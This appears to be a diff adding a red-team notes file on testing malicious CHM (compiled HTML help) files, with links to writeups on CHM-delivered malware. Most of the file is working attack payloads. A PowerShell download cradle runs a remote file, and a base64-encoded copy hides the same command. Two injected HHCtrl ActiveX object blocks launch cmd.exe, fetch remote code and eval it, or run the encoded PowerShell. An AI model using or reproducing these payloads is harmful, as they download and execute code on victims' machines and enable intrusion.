@@ -1,0 +1,27 @@
+CHM testing
+https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7
+https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/
+https://blog.rootshell.be/2017/12/19/malware-delivered-via-compiled-html-help-file/
+
+
+
+
+https://github.com/kobezt08/test/blob/master/bitsgdosutil.exe
+iex (new-object net.webclient).downloadstring('https://github.com/kobezt08/test/raw/master/bitsgdosutil.exe')
+
+aWV4IChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwczovL2dpdGh1Yi5jb20va29iZXp0MDgvdGVzdC9yYXcvbWFzdGVyL2JpdHNnZG9zdXRpbC5leGUnKQ==
+
+
+
+document.write('<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>');
+ document.write('<PARAM name="Command" value="ShortCut">');
+  document.write('<PARAM name="Button" value="Bitmap::shortcut">');
+  document.write('<PARAM name="Item1" value=\'",cmd.exe,/c copy /Y C:\Windows\system32\rundll32.exe %TEMP%\out.exe > nul && %TEMP%\out.exe javascript:"\..\mshtml RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://github.com/kobezt08/test/blob/master/bitsgdosutil.exe",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im out.exe",0,true);}"\'>');
+  document.write('<PARAM name="Item2" value="273,1,1">');
+document.write('</OBJECT>');
+
+document.write('<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>');
+ document.write('<PARAM name="Command" value="ShortCut">');
+  document.write('<PARAM name="Button" value="Bitmap::shortcut">');
+  document.write('<PARAM name="Item1" value=\'",cmd.exe,/c taskkill.exe /f /im hh.exe  && c:\windows\system32\windowspowershell\v1.0\powershell.exe -NoProfile -end "aWV4IChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwczovL2dpdGh1Yi5jb20va29iZXp0MDgvdGVzdC9yYXcvbWFzdGVyL2JpdHNnZG9zdXRpbC5leGUnKQ==""\'>');
+document.write('</OBJECT>');
